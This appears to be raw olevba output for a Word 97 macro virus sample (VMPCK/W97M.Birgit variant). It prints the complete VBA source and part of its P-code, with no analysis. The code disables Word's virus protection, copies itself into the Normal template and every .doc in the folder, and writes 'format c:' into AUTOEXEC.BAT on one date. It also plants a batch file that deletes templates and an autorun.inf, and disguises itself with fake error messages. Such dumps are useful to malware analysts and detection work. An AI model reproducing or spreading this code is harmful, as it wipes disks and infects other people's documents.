olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.VMPCK1.dl
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.VMPCK1.dl - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Ariel.bas 
in file: ./Virus.MSWord.VMPCK1.dl - OLE stream: 'Macros/VBA/Ariel'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub Ariel()
    
On Error Resume Next

Randomize

If Month(Now()) = 1 And Day(Now()) = 24 Then
    MsgBox ("Say HAPPY BIRTHDAY TO SHANKAR")
    Open ("C:\AUTOEXEC.BAT") For Output As #1
    Print #1, "@echo off"
    Print #1, "@echo SAY HAPPY BIRTHDAY TO SHANKAR"
    Print #1, "@echo Happy birthday........Happy birhday......"
    Print #1, "ctty nul"
    Print #1, "format c: /autotest /q /u"
    
End If

Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.SavePropertiesPrompt = False
Options.ConfirmConversions = False

Application.VBE.ActiveVBProject.VBComponents("Ariel").Export "c:\Ariel.sys"
ActiveDocument.ReadOnlyRecommended = False
rm = Int(Rnd * 100)
    If rm = 99 Then MsgBox "Not infected", vbSystemModal
f16935 = u5803 & c7210 & Int(Rnd * 1509)
f9377 = u14754 & c17776 & k15060 & m14754
If Day(Now()) = 19 Then Call p4788
If Month(Now()) = 3 And Day(Now()) = 19 Then MsgBox "BIRGIT FOREVER", vbInformation, "Birthday Greeting!!!"
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "Doctor Rave"
    .Title = "W97M.Birgit.B"
    .Subject = "Birgit"
    .Comments = "You're infected with the W97M.Birgit.B Virus !!!"
    .Execute
End With
 f8250$ = "c:\windows\startm~1\programs\startup\msfile.bat"
f8162 = u12951 & c2030 & Int(Rnd * 3893)
i47887995 = GetAttr(NormalTemplate.FullName)
If i47887995 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f8250$)
If i47887995 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f8250$)
If i47887995 = vbReadOnly Then GoTo fuckoff
If i47887995 = vbReadOnly + vbArchive Then GoTo fuckoff
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "Ariel" Then Unit187799563813 = True
Next I
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "Ariel" Then o0o63819 = True
Next I
If Unit187799563813 = True And o0o63819 = False Then Set p638179959 = NormalTemplate.VBProject.VBComponents
If Unit187799563813 = False And o0o63819 = True Then Set p638179959 = ActiveDocument.VBProject.VBComponents
p638179959.import "c:\Ariel.sys"
If Unit187799563813 = True And o0o63819 = False Then Shell ("label c: Infected"), 0
If Unit187799563813 = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If o0o63819 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
            Call dhIconDisco("C:\autorun.inf")
'VMPCK v1.0c [SR-1 Compatable]
fuckoff:
End Sub
Sub HelpAbout()
    On Error Resume Next
    MsgBox "Infected", vbInformation
End Sub
Sub FileNew()
    On Error Resume Next
    Call Ariel
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call Ariel
End Sub
Sub FileClose()
    On Error Resume Next
    Call Ariel
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub ToolsOptions()
    On Error Resume Next
f11162 = u7698 & c11555 & Int(Rnd * 3728)
Dialogs(wdDialogToolsOptions).Show
k2187 = m16884 & e13658
    Call Ariel
End Sub
Sub FileExit()
    On Error Resume Next
f7757 = u19016 & c6779 & k9310 & m19016
    Call Ariel
f9543 = u11958 & c10557 & Int(Rnd * 7751)
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Ariel
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Ariel
End If
Loop
    Application.Quit
End Sub
Sub AutoOpen()
    On Error Resume Next
f12150 = u8114 & c13905 & Int(Rnd * 3994)
    Call Ariel
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Ariel
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Ariel
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Ariel
End If
Loop
End Sub
Sub AutoClose()
    On Error Resume Next
    Call Ariel
End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call Ariel
MsgBox "Word Basic Err =7"
k18504 = m6653 & e14048
End Sub
Sub FileTemplates()
    On Error Resume Next
    Call Ariel
MsgBox "Word Basic Err =7"
End Sub
Sub ViewVBCode()
    On Error Resume Next
k18160 = m7554 & e2873
    Call Ariel
MsgBox "Word Basic Err =7"
End Sub
Sub p4788()
    On Error Resume Next
f8967 = u3474 & c7903 & k6843 & m3474
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "il"
            .Replacement.Text = "li"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
f9133 = u10677 & c10684 & Int(Rnd * 4163)
End Sub
    
Sub vBitchES(strFile As String)
    
Dim hFile As Long
On Error Resume Next
n$ = NormalTemplate
Part11$ = "attrib -h -r "
snag$ = "c:\progra~1\micros~1\templa~1\"
f6526 = u14521 & c17335 & Int(Rnd * 7920)
snag1$ = "c:\progra~1\micros~2\templa~1\"
f14501 = u14848 & c11089 & Int(Rnd * 8258)
Part2$ = "del "
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
End Sub
Sub dhIconDisco(strFile As String)
Dim hFile As Long
On Error Resume Next
Randomize
f18727 = u16742 & c5435 & Int(Rnd * 8926)
Choice = Int(Rnd * 2)
k8534 = m12807 & e9975
rnn$ = Int(Rnd * 66) + 2
rn$ = Int(Rnd * 27) + 1
f10751 = u6416 & c1682 & Int(Rnd * 140)
Part1$ = "[autorun]"
Part2$ = "icon = c:\windows\system\pifmgr.dll,"
Part22$ = "icon = c:\windows\SYSTEM\shell32.dll,"
Part3$ = Part2$ + rn$
Part33$ = Part22$ + rnn$
    hFile = FreeFile
    Open strFile For Output Access Write As hFile
    Print #hFile, Part1$
    If Choice = 0 Then
        Print #hFile, Part3$
    Else
        Print #hFile, Part33$
    End If
    Close hFile
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.VMPCK1.dl
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Ariel - 12574 bytes
' Line #0:
' Line #1:
' 	Dim (Public) 
' 	VarDefn Skip (As Integer)
' Line #2:
' Line #3:
' Line #4:
' 	FuncDefn (Sub Ariel())
' Line #5:
' Line #6:
' 	OnError (Resume Next) 
' Line #7:
' Line #8:
' 	ArgsCall Read 0x0000 
' Line #9:
' Line #10:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0018 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #11:
' 	LitStr 0x001D "Say HAPPY BIRTHDAY TO SHANKAR"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #12:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	Paren 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #13:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #14:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "@echo SAY HAPPY BIRTHDAY TO SHANKAR"
' 	PrintItemNL 
' Line #15:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002F "@echo Happy birthday........Happy birhday......"
' 	PrintItemNL 
' Line #16:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "ctty nul"
' 	PrintItemNL 
' Line #17:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "format c: /autotest /q /u"
' 	PrintItemNL 
' Line #18:
' Line #19:
' 	EndIfBlock 
' Line #20:
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #23:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #24:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #25:
' Line #26:
' 	LitStr 0x000C "c:\Ariel.sys"
' 	LitStr 0x0005 "Ariel"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #27:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #28:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	St rm 
' Line #29:
' 	Ld rm 
' 	LitDI2 0x0063 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "Not infected"
' 	Ld vbSystemModal 
' 	ArgsCall MsgBox 0x0002 
' 	EndIf 
' Line #30:
' 	Ld u5803 
' 	Ld c7210 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x05E5 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St f16935 
' Line #31:
' 	Ld u14754 
' 	Ld c17776 
' 	Concat 
' 	Ld k15060 
' 	Concat 
' 	Ld m14754 
' 	Concat 
' 	St f9377 
' Line #32:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) p4788 0x0000 
' 	EndIf 
' Line #33:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0013 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000E "BIRGIT FOREVER"
' 	Ld vbInformation 
' 	LitStr 0x0014 "Birthday Greeting!!!"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #34:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #35:
' 	LitStr 0x000B "Doctor Rave"
' 	MemStWith Author 
' Line #36:
' 	LitStr 0x000D "W97M.Birgit.B"
' 	MemStWith Title 
' Line #37:
' 	LitStr 0x0006 "Birgit"
' 	MemStWith Subject 
' Line #38:
' 	LitStr 0x0030 "You're infected with the W97M.Birgit.B Virus !!!"
' 	MemStWith Comments 
' Line #39:
' 	ArgsMemCallWith Execute 0x0000 
' Line #40:
' 	EndWith 
' Line #41:
' 	LitStr 0x002F "c:\windows\startm~1\programs\startup\msfile.bat"
' 	St f8250$ 
' Line #42:
' 	Ld u12951 
' 	Ld c2030 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0F35 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St f8162 
' Line #43:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St i47887995 
' Line #44:
' 	Ld i47887995 
' 	Ld vbReadOnly 
' 	Eq 
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	And 
' 	Ld System 
' 	MemLd LanguageDesignation 
' 	LitStr 0x0016 "English(United States)"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld f8250$ 
' 	ArgsCall (Call) vBitchES 0x0001 
' 	EndIf 
' Line #45:
' 	Ld i47887995 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	And 
' 	Ld System 
' 	MemLd LanguageDesignation 
' 	LitStr 0x0016 "English(United States)"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld f8250$ 
' 	ArgsCall (Call) vBitchES 0x0001 
' 	EndIf 
' Line #46:
' 	Ld i47887995 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo fuckoff 
' 	EndIf 
' Line #47:
' 	Ld i47887995 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo fuckoff 
' 	EndIf 
' Line #48:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #49:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Ariel"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Unit187799563813 
' 	EndIf 
' Line #50:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #51:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #52:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Ariel"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St o0o63819 
' 	EndIf 
' Line #53:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #54:
' 	Ld Unit187799563813 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld o0o63819 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set p638179959 
' 	EndIf 
' Line #55:
' 	Ld Unit187799563813 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld o0o63819 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set p638179959 
' 	EndIf 
' Line #56:
' 	LitStr 0x000C "c:\Ariel.sys"
' 	Ld p638179959 
' 	ArgsMemCall import 0x0001 
' Line #57:
' 	Ld Unit187799563813 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld o0o63819 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0011 "label c: Infected"
' 	Paren 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' 	EndIf 
' Line #58:
' 	Ld Unit187799563813 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld Skip 
' 	LitDI2 0x0001 
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #59:
' 	Ld o0o63819 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' 	EndIf 
' Line #60:
' 	LitStr 0x000E "C:\autorun.inf"
' 	ArgsCall (Call) dhIconDisco 0x0001 
' Line #61:
' 	QuoteRem 0x0000 0x001D "VMPCK v1.0c [SR-1 Compatable]"
' Line #62:
' 	Label fuckoff 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Sub HelpAbout())
' Line #65:
' 	OnError (Resume Next) 
' Line #66:
' 	LitStr 0x0008 "Infected"
' 	Ld vbInformation 
' 	ArgsCall MsgBox 0x0002 
' Line #67:
' 	EndSub 
' Line #68:
' 	FuncDefn (Sub FileNew())
' Line #69:
' 	OnError (Resume Next) 
' Line #70:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #71:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #72:
' 	LitDI2 0x0001 
' 	St Skip 
' Line #73:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #74:
' 	EndSub 
' Line #75:
' 	FuncDefn (Sub FileClose())
' Line #76:
' 	OnError (Resume Next) 
' Line #77:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #78:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #79:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #80:
' 	EndSub 
' Line #81:
' 	FuncDefn (Sub ToolsOptions())
' Line #82:
' 	OnError (Resume Next) 
' Line #83:
' 	Ld u7698 
' 	Ld c11555 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0E90 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St f11162 
' Line #84:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #85:
' 	Ld m16884 
' 	Ld e13658 
' 	Concat 
' 	St k2187 
' Line #86:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #87:
' 	EndSub 
' Line #88:
' 	FuncDefn (Sub FileExit())
' Line #89:
' 	OnError (Resume Next) 
' Line #90:
' 	Ld u19016 
' 	Ld c6779 
' 	Concat 
' 	Ld k9310 
' 	Concat 
' 	Ld m19016 
' 	Concat 
' 	St f7757 
' Line #91:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #92:
' 	Ld u11958 
' 	Ld c10557 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x1E47 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St f9543 
' Line #93:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #94:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #95:
' 	Ld CurDir 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St pName 
' Line #96:
' 	Ld pName 
' 	LitStr 0x0005 "*.doc"
' 	Concat 
' 	Ld sAttr 
' 	ArgsLd Dir 0x0002 
' 	St fName 
' Line #97:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' 	EndIf 
' Line #98:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #99:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #100:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	DoWhile 
' Line #101:
' 	ArgsLd Dir 0x0000 
' 	St fName 
' Line #102:
' 	LineCont 0x0004 07 00 00 00
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #103:
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' Line #104:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #105:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #106:
' 	EndIfBlock 
' Line #107:
' 	Loop 
' Line #108:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #109:
' 	EndSub 
' Line #110:
' 	FuncDefn (Sub AutoOpen())
' Line #111:
' 	OnError (Resume Next) 
' Line #112:
' 	Ld u8114 
' 	Ld c13905 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0F9A 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St f12150 
' Line #113:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #114:
' 	EndSub 
' Line #115:
' 	FuncDefn (Sub AutoExit())
' Line #116:
' 	OnError (Resume Next) 
' Line #117:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #118:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #119:
' 	Ld CurDir 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St pName 
' Line #120:
' 	Ld pName 
' 	LitStr 0x0005 "*.doc"
' 	Concat 
' 	Ld sAttr 
' 	ArgsLd Dir 0x0002 
' 	St fName 
' Line #121:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' 	EndIf 
' Line #122:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #123:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #124:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	DoWhile 
' Line #125:
' 	ArgsLd Dir 0x0000 
' 	St fName 
' Line #126:
' 	LineCont 0x0004 07 00 00 00
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #127:
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' Line #128:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #129:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #130:
' 	EndIfBlock 
' Line #131:
' 	Loop 
' Line #132:
' 	EndSub 
' Line #133:
' 	FuncDefn (Sub AutoClose())
' Line #134:
' 	OnError (Resume Next) 
' Line #135:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #136:
' 	EndSub 
' Line #137:
' 	FuncDefn (Sub ToolsMacro())
' Line #138:
' 	OnError (Resume Next) 
' Line #139:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #140:
' 	LitStr 0x0011 "Word Basic Err =7"
' 	ArgsCall MsgBox 0x0001 
' Line #141:
' 	Ld m6653 
' 	Ld e14048 
' 	Concat 
' 	St k18504 
' Line #142:
' 	EndSub 
' Line #143:
' 	FuncDefn (Sub FileTemplates())
' Line #144:
' 	OnError (Resume Next) 
' Line #145:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #146:
' 	LitStr 0x0011 "Word Basic Err =7"
' 	ArgsCall MsgBox 0x0001 
' Line #147:
' 	EndSub 
' Line #148:
' 	FuncDefn (Sub ViewVBCode())
' Line #149:
' 	OnError (Resume Next) 
' Line #150:
' 	Ld m7554 
' 	Ld e2873 
' 	Concat 
' 	St k18160 
' Line #151:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #152:
' 	LitStr 0x0011 "Word Basic Err =7"
' 	ArgsCall MsgBox 0x0001 
' Line #153:
' 	EndSub 
' Line #154:
' 	FuncDefn (Sub p4788())
' Line #155:
' 	OnError (Resume Next) 
' Line #156:
' 	Ld u3474 
' 	Ld c7903 
' 	Concat 
' 	Ld k6843 
' 	Concat 
' 	Ld m3474 
' 	Concat 
' 	St f8967 
' Line #157:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #158:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #159:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #160:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #161:
' 	LitStr 0x0002 "il"
' 	MemStWith Then 
' Line #162:
' 	LitStr 0x0002 "li"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #163:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #164:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #165:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #166:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #167:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #168:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #169:
' 	EndWith 
' Line #170:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #171:
' 	Ld u10677 
' 	Ld c10684 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x1043 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St f9133 
' Line #172:
' 	EndSub 
' Line #173:
' Line #174:
' 	FuncDefn (Sub vBitchES(strFile As String))
